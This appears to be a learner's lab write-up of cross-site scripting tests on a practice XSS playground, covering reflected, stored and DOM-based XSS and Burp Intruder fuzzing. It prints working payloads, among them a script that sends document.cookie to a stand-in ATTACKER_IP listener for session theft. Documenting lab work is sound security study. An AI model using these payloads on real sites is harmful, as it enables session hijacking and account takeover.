# 🔐 Cross-Site Scripting (XSS) on pentest-ground.com:4280

📍 **Environment:** Kali Linux + browser + Burp Suite  
🎯 **Target:** `https://pentest-ground.com:4280/` (XSS playground)  
🛠️ **Tools:** Browser, Burp Suite (Repeater, Intruder), Netcat, XSS cheat sheet

---

## 🎯 What I Did Today

### 1. Input Vector Mapping
- Explored the application: search bar, comment field, profile name, and URL query parameters.
- Identified multiple user-controllable inputs that were reflected into the page without sanitization.

### 2. Reflected XSS
- Tested the search parameter by injecting `<script>alert(1)</script>` directly into the URL query string.
- The payload executed immediately – a classic reflected XSS, exploitable via phishing links.

### 3. Cookie Theft via Reflected XSS
- Crafted a payload: `<script>fetch('http://ATTACKER_IP:4444?c='+document.cookie)</script>`.
- Started a netcat listener, triggered the payload, and captured the victim's session cookie.
- Confirmed the cookie lacked the `HttpOnly` flag, enabling full session hijacking.

### 4. Stored XSS in Comments
- Posted a comment containing `<script>alert('stored')</script>`.
- The page rendered the script on every subsequent visit – no user interaction required.
- Classified as **high severity** because it affects all visitors.

### 5. DOM-Based XSS
- Found that URL fragment (`#`) values were being passed to `innerHTML` without sanitization.
- Injected `<img src=x onerror=alert(1)>` in the fragment and triggered execution.
- Demonstrated that DOM XSS runs entirely on the client side, bypassing server-side checks.

### 6. Fuzzing with Burp Intruder
- Used a custom XSS wordlist (PortSwigger cheatsheet) with Burp Intruder.
- Sniper attack on the search parameter highlighted multiple working payloads.
- Identified that only `<script>` and `<img>` vectors were effective; WAF-like filter bypassed with event handlers.

---

## 🧠 Key Findings

| Vector | Vulnerability | Impact |
|--------|---------------|--------|
| **GET parameter (search)** | Reflected XSS | Cookie theft, phishing, URL redirection |
| **Comment field** | Stored XSS | Persistent script execution for all users – mass session hijacking |
| **URL fragment** | DOM-based XSS | Client-side code execution, no server logging |
| **Cookie flags** | Missing `HttpOnly` | Stealing cookies = full account takeover |
| **Burp Intruder fuzzing** | Multiple payloads triggered | Inconsistent filtering – bypass is possible |

> 💡 **Core lesson:** XSS is not just about alert boxes. It's the gateway to session hijacking, credential theft, and complete account takeover. Every input that touches the DOM is a potential weapon.

